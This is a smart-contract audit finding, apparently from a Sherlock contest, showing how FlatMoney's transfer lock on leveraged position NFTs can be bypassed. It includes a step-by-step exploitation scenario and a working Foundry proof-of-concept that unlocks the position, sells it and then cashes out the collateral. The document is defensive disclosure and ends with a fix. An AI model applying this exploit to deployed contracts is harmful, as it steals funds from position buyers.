# r0ck3tz - The transfer lock for leveraged position orders can be bypassed

**Severity:** high
**Auditor:** Sherlock
**Protocol:** FlatMoney
**Keywords:** cybersecurity, vulnerability, leveraged positions, transfer lock, bypass, DelayedOrder, LimitOrder, LeverageModule, lock function, token transfer, exploitation scenario, cancelLimitOrder, executeOrder, collateral theft, proof of concept, manual review, security recommendation, order announcement, position unlocking, funds stealing

---

r0ck3tz

high

# The transfer lock for leveraged position orders can be bypassed

## Summary

The leveraged positions can be closed either through [\u0060DelayedOrder\u0060](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L28-L681) or through the [\u0060LimitOrder\u0060](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LimitOrder.sol#L27-L214). Once the order is announced via \u0060DelayedOrder.announceLeverageClose\u0060 or \u0060LimitOrder.announceLimitOrder\u0060 function the \u0060LeverageModule\u0060\u0027s \u0060lock\u0060 function is called to prevent given token to be transferred. This mechanism can be bypassed and it is possible to unlock the token transfer while having order announced.

## Vulnerability Detail

Exploitation scenario:
1. Attacker announces leverage close order for his position via \u0060announceLeverageClose\u0060 of \u0060DelayedOrder\u0060 contract.
2. Attacker announces limit order via \u0060announceLimitOrder\u0060 of \u0060LimitOrder\u0060 contract.
3. Attacker cancels limit order via \u0060cancelLimitOrder\u0060 of \u0060LimitOrder\u0060 contract.
4. The position is getting unlocked while the leverage close announcement is active.
5. Attacker sells the leveraged position to a third party.
6. Attacker executes the leverage close via \u0060executeOrder\u0060 of \u0060DelayedOrder\u0060 contract and gets the underlying collateral stealing the funds from the third party that the leveraged position was sold to.

Following proof of concept presents the attack:
\u0060\u0060\u0060solidity
function testExploitTransferOut() public {
    uint256 collateralPrice = 1000e8;

    vm.startPrank(alice);

    uint256 balance = WETH.balanceOf(alice);
    console2.log("alice balance", balance);
    
    (uint256 minFillPrice, ) = oracleModProxy.getPrice();

    // Announce order through delayed orders to lock tokenId
    delayedOrderProxy.announceLeverageClose(
        tokenId,
        minFillPrice - 100, // add some slippage
        mockKeeperFee.getKeeperFee()
    );
    
    // Announce limit order to lock tokenId
    limitOrderProxy.announceLimitOrder({
        tokenId: tokenId,
        priceLowerThreshold: 900e18,
        priceUpperThreshold: 1100e18
    });
    
    // Cancel limit order to unlock tokenId
    limitOrderProxy.cancelLimitOrder(tokenId);
    
    balance = WETH.balanceOf(alice);
    console2.log("alice after creating two orders", balance);

    // TokenId is unlocked and can be transferred while the delayed order is active
    leverageModProxy.transferFrom(alice, address(0x1), tokenId);
    console2.log("new owner of position NFT", leverageModProxy.ownerOf(tokenId));

    balance = WETH.balanceOf(alice);
    console2.log("alice after transfering position NFT out e.g. selling", balance);

    skip(uint256(vaultProxy.minExecutabilityAge())); // must reach minimum executability time

    uint256 oraclePrice = collateralPrice;

    bytes[] memory priceUpdateData = getPriceUpdateData(oraclePrice);
    delayedOrderProxy.executeOrder{value: 1}(alice, priceUpdateData);

    uint256 finalBalance = WETH.balanceOf(alice);
    console2.log("alice after executing delayerd order and cashing out profit", finalBalance);
    console2.log("profit", finalBalance - balance);
}
\u0060\u0060\u0060

Output
\u0060\u0060\u0060shell
Running 1 test for test/unit/Common/LimitOrder.t.sol:LimitOrderTest
[PASS] testExploitTransferOut() (gas: 743262)
Logs:
  alice balance 99879997000000000000000
  alice after creating two orders 99879997000000000000000
  new owner of position NFT 0x0000000000000000000000000000000000000001
  alice after transfering position NFT out e.g. selling 99879997000000000000000
  alice after executing delayerd order and cashing out profit 99889997000000000000000
  profit 10000000000000000000

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 50.06ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
\u0060\u0060\u0060

## Impact

The attacker can sell the leveraged position with a close order opened, execute the order afterward, and steal the underlying collateral.

## Code Snippet
- https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L298
- https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LimitOrder.sol#L76
- https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LimitOrder.sol#L94

## Tool used

Manual Review

## Recommendation

It is recommended to prevent announcing order either through \u0060DelayedOrder.announceLeverageClose\u0060 or \u0060LimitOrder.announceLimitOrder\u0060 if the leveraged position is already locked.

